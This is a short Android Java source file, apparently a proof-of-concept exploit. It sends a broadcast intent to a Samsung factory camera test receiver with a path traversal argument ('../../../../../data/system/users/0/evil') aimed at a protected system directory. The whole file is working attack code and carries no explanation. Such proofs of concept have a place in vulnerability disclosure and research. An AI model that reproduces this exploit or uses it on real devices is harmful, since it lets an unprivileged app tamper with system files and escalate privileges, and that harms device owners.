package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent("com.sec.samsungtest.ACTION_CAMERATEST");
        i.setClassName("com.sec.factory.camera", "com.sec.android.app.camera.AtBroadcastReceiver");
        i.putExtra("testtype", "NCAMTEST");
        i.putExtra("arg1", "2");
        i.putExtra("arg2", "1");
        i.putExtra("arg3", "1");
        i.putExtra("arg4", "../../../../../data/system/users/0/evil");
        sendBroadcast(i);
    }
}